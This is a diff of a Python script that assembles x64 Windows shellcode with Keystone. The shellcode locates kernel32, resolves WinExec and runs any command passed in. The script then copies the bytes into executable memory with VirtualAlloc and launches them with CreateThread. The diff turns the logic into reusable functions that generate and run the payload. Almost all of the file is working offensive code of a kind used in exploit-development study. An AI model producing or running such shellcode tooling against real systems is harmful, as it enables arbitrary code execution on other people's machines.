@@ -4,20 +4,24 @@ import os
 import sys
 import subprocess
 from keystone import *
+
 def encodeCommand(command):
     # Pad commands
     command = command.ljust(8, ' ')
+    print("     making "+command+" multiple of 8...")
     # Convert ASCII characters to bytes
     result = "".join("{:02x}".format(ord(c)) for c in command)
+    print("     converting to bytes...")
     # Reverse the bytes for little endian formatting
     ba = bytearray.fromhex(result)
     ba.reverse()
     ba.hex()
-    return("0x" + ba.hex())
+    return("     0x" + ba.hex())
  
 def command(command):
     # Split command into 8 byte chunks
     size = 8
+    print("splitting into 8 byte chunks...")
     chunks = [command[i:i+size] for i in range(0, len(command), size)]
  
     output = ""
@@ -28,14 +32,13 @@ def command(command):
        output += "push rax; "
  
     for i in reversed(chunks):
-        print(i)
         output += "mov rax, " + encodeCommand(i) + "; "
         output += "push rax; "
  
     return output
-def main():
-
-
+    
+    
+def winexec_one_command(winexec_payload,space):
     GET_KERNEL = (
         " start: "
         #" int3;"
@@ -102,52 +105,60 @@ def main():
     )
 
 
- 
-    # Initialize engine in 64-Bit mode
     ks = Ks(KS_ARCH_X86, KS_MODE_64)
     instructions, count = ks.asm(GET_KERNEL)
- 
+    
     sh = b""
     output = ""
+    
     for opcode in instructions:
         sh += struct.pack("B", opcode)                          # To encode for execution
-        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
+        output += space+"{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
  
     instructions, count = ks.asm(GET_EXPORTS)
 
     for opcode in instructions:
         sh += struct.pack("B", opcode)                          # To encode for execution
-        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
+        output += space+"{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
     instructions, count = ks.asm(FIND_FUNCTION)
 
     for opcode in instructions:
         sh += struct.pack("B", opcode)                          # To encode for execution
-        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
+        output += space+"{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
-    for argument in sys.argv[1:]:
-        CALL_FUNCTION = (
-            "" +  str(command(argument)) + ""
-            "  mov rcx, rsp;"                   # Move a pointer to calc.exe into RCX.
-            "  xor rdx,rdx;"                    # Zero RDX   
-            "  inc rdx;"                        # RDX set to 1 = uCmdShow
-            "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
-            "  call r14;"                       # Call WinExec
-        )
+    autopush=str(command(winexec_payload))
+    print("resulting asm for push:")
+    print(autopush)
+    
+    CALL_FUNCTION = (
+        "" +  autopush + ""
+        "  mov rcx, rsp;"                   # Move a pointer to calc.exe into RCX.
+        "  xor rdx,rdx;"                    # Zero RDX   
+        "  inc rdx;"                        # RDX set to 1 = uCmdShow
+        "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
+        "  call r14;"                       # Call WinExec
+    )
 
-        instructions, count = ks.asm(CALL_FUNCTION)
+    instructions, count = ks.asm(CALL_FUNCTION)
 
-        for opcode in instructions:
-            sh += struct.pack("B", opcode)                          # To encode for execution
-            output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
  
-    shellcode = bytearray(sh)
-    print("Shellcode: "  + output )
-    print("Bytes: " + str(len(sh)))
-    print("Attaching debugger to " + str(os.getpid()));
-    #subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
+    for opcode in instructions:
+        sh += struct.pack("B", opcode)                          # To encode for execution
+        output += space+"{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
+    
+    
+    return sh,output
+
+    
+    
+    
+    
+def run_shellcode_w4so(sh):
+        
+    shellcode = bytearray(sh)    
     input("Press any key to continue...");
- 
+    
     ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
     ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
     ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
@@ -157,6 +168,4 @@ def main():
     ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
     handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
     ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
- 
-if __name__ == "__main__":
-    main()
+        
